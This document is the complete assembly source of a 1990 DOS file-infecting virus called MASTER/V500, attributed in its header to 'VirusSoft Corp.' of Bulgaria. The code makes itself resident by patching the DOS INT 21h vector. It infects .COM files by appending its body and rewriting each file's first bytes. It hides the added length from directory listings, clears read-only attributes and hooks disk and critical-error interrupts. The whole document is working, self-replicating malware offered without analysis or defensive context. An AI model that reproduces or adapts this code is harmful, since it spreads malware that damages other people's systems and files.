;        (C) Copyright VirusSoft Corp.  Sep., 1990
;
;   This is the SOURCE file of last version of MASTER,(V500),(MG) ect.
;   virus, distributed by VirusSoft company . First version was made
;   in   May., 1990 . Please don't make any corections in this file !
;
;                        Bulgaria, Varna
;                        Sep. 27, 1990



         ofs = 201h
         len = offset end-ofs

         call  $+6

         org   ofs

first:   dw    020cdh
         db    0

         pop   di
         dec   di
         dec   di
         mov   si,[di]
         dec   di
         add   si,di
         push  cs
         push  di
         cld
         movsw
         movsb
         xchg  ax,dx

         mov   ax,4b04h
         int   21h
         jnc   residnt

         xor   ax,ax
         mov   es,ax
         mov   di,ofs+3
         mov   cx,len-3
         rep   movsb

         les   di,[6]
         mov   al,0eah
         dec   cx
         repne scasb
         les   di,es:[di]         ; Searching for the INT21 vector
         sub   di,-1ah-7

         db    0eah
         dw    offset jump,0      ; jmp far 0000:jump

jump:    push  es
         pop   ds
         mov   si,[di+3-7]        ;
         lodsb                    ;
         cmp   al,68h             ; compare DOS Ver
         mov   [di+4-7],al        ; Change CMP AH,CS:[????]
         mov   [di+2-7],0fc80h    ;
         mov   [di-7],0fccdh      ;

         push  cs
         pop   ds

         mov   [1020],di          ; int  0ffh
         mov   [1022],es

         mov   beg-1,byte ptr not3_3-beg
         jb    not3.3             ; CY = 0  -->  DOS Ver > or = 3.30
         mov   beg-1,byte ptr 0
         mov   [7b4h],offset pr7b4
         mov   [7b6h],cs          ; 7b4

not3.3:  mov   al,0a9h            ; Change attrib
cont:    repne scasb
         cmp   es:[di],0ffd8h
         jne   cont
         mov   al,18h
         stosb

         push  ss
         pop   ds

         push  ss
         pop   es

residnt: xchg  ax,dx
         retf                     ; ret   far

;--------Interrupt process--------;

i21pr:   push  ax
         push  dx
         push  ds
         push  cx
         push  bx
         push  es

if4b04:  cmp   ax,4b04h
         je    rti

         xchg  ax,cx
         mov   ah,02fh
         int   0ffh

if11_12: cmp   ch,11h
         je    yes
         cmp   ch,12h
         jne   inffn
yes:     xchg  ax,cx
         int   0ffh
         push  ax
         test  es:byte ptr [bx+19],0c0h
         jz    normal
         sub   es:[bx+36],len
normal:  pop   ax
rti:     pop   es
         pop   bx
         pop   cx
         add   sp,12
         iret

inffn:   mov   ah,19h
         int   0ffh
         push  ax

if36:    cmp   ch,36h             ; -free bytes
         je    beg_36
if4e:    cmp   ch,4eh             ; -find first FM
         je    beg_4b
if4b:    cmp   ch,4bh             ; -exec
         je    beg_4b
if47:    cmp   ch,47h             ; -directory info
         jne   if5b
         cmp   al,2
         jae   begin              ; it's hard-disk
if5b:    cmp   ch,5bh             ; -create new
         je    beg_4b
if3c_3d: shr   ch,1               ; > -open & create
         cmp   ch,1eh             ;   -
         je    beg_4b

         jmp   rest

beg_4b:  mov   ax,121ah
         xchg  dx,si
         int   2fh
         xchg  ax,dx
         xchg  ax,si

beg_36:  mov   ah,0eh             ; change current drive
         dec   dx                 ;
         int   0ffh               ;

begin:
         push  es                 ; save DTA address
         push  bx                 ;
         sub   sp,44
         mov   dx,sp              ; change DTA
         push  sp
         mov   ah,1ah
         push  ss
         pop   ds
         int   0ffh
         mov   bx,dx

         push  cs
         pop   ds

         mov   ah,04eh
         mov   dx,offset file
         mov   cx,3               ; r/o , hidden
         int   0ffh               ; int   21h
         jc    lst

next:    test  ss:[bx+21],byte ptr 80h
         jz    true
nxt:     mov   ah,4fh             ; find next
         int   0ffh
         jnc   next
lst:     jmp   last

true:    cmp   ss:[bx+27],byte ptr 0fdh
         ja    nxt
         mov   [144],offset i24pr
         mov   [146],cs

         les   ax,[4ch]           ; int 13h
         mov   i13adr,ax
         mov   i13adr+2,es
         jmp   short $
beg:     mov   [4ch],offset i13pr
         mov   [4eh],cs
         ;
not3_3:  push  ss
         pop   ds
         push  [bx+22]            ; time +
         push  [bx+24]            ; date +
         push  [bx+21]            ; attrib +
         lea   dx,[bx+30]         ; ds : dx = offset file name
         mov   ax,4301h           ; Change attrib !!!
         pop   cx
         and   cx,0feh            ; clear r/o and CH
         or    cl,0c0h            ; set Infect. attr
         int   0ffh

         mov   ax,03d02h          ; open
         int   0ffh               ; int   21h
         xchg  ax,bx

         push  cs
         pop   ds

         mov   ah,03fh
         mov   cx,3
         mov   dx,offset first
         int   0ffh

         mov   ax,04202h          ; move fp to EOF
         xor   dx,dx
         mov   cx,dx
         int   0ffh
         mov   word ptr cal_ofs+1,ax

         mov   ah,040h
         mov   cx,len
         mov   dx,ofs
         int   0ffh
         jc    not_inf

         mov   ax,04200h
         xor   dx,dx
         mov   cx,dx
         int   0ffh

         mov   ah,040h
         mov   cx,3
         mov   dx,offset cal_ofs
         int   0ffh

not_inf: mov   ax,05701h
         pop   dx                 ; date
         pop   cx                 ; time
         int   0ffh

         mov   ah,03eh            ; close
         int   0ffh

         les   ax,dword ptr i13adr
         mov   [4ch],ax           ; int 13h
         mov   [4eh],es

last:    add   sp,46
         pop   dx
         pop   ds                 ; restore DTA
         mov   ah,1ah
         int   0ffh

rest:    pop   dx                 ; restore current drive
         mov   ah,0eh             ;
         int   0ffh               ;

         pop   es
         pop   bx
         pop   cx
         pop   ds
         pop   dx
         pop   ax

i21cl:   iret                     ; Return from INT FC

i24pr:   mov   al,3               ; Critical errors
         iret

i13pr:   cmp   ah,3
         jne   no
         inc   byte ptr cs:activ
         dec   ah
no:      jmp   dword ptr cs:i13adr

pr7b4:         db    2eh,0d0h,2eh
               dw    offset activ
;        shr   cs:activ,1
         jnc   ex7b0
         inc   ah
ex7b0:   jmp   dword ptr cs:[7b0h]

;--------

file:    db    "*",32,".COM"

activ:   db    0

         dw    offset i21pr      ; int 0fch
         dw    0

cal_ofs: db    0e8h

end:
         dw    ?                  ; cal_ofs

i13adr:  dw    ?
         dw    ?


; The End.